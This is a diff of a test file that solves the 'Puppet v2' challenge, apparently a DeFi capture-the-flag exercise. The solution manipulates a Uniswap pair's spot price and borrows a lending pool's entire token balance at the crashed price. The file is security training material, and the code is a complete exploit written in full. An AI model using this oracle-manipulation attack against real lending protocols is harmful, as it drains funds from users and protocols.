@@ -81,22 +81,26 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
-        
+        /** CODE YOUR EXPLOIT HERE */     
         //connect attacker to smart contrats
         const attackPuppetV2 = this.lendingPool.connect(attacker);
         const attackToken = this.token.connect(attacker);
-        const attackUniSwap = this.uniswapExchange.connect(attacker);
+        const attackUniSwap = this.uniswapExchange.connect(attacker)
+        const attackWETH = this.weth.connect(attacker);
 
-        console.log("number of tokens for uniswap: ", await attackToken.balanceOf(attackUniSwap.address))
-        console.log("number of tokens for lending pool after transfer: ", await attackToken.balanceOf(attackPuppetV2.address))
-        // attackToken.transfer(attackUniSwap.address, await attackToken.balanceOf(attacker.address))
-        // console.log("number of tokens for uniswap after transfer: ", await attackToken.balanceOf(attackUniSwap.address))
-        //get conversationRate
+        //transform ETH into WETH 
+        await attackWETH.deposit({value: ethers.utils.parseEther('19.9')})
 
-        console.log("Amount needed: ", await attackPuppetV2.calculateDepositOfWETHRequired(1000000))
+        //transfer tokens to uniswap pair in order to devaluate token
+        await attackToken.transfer(attackUniSwap.address, ethers.utils.parseEther('9999'))
+        //swap all the ethers out in order to devaluate even more the tokens
+        await attackUniSwap.swap(1, ethers.utils.parseEther('9.9'), attacker.address, [])
 
+        //approve the pool to take all the eth out of attacker balance 
+        await attackWETH.approve(attackPuppetV2.address, await this.weth.balanceOf(attacker.address))
 
+        //now that token is totally devaluated, borrow the totallity 
+        await attackPuppetV2.borrow(await attackToken.balanceOf(attackPuppetV2.address))
     });
 
     after(async function () {
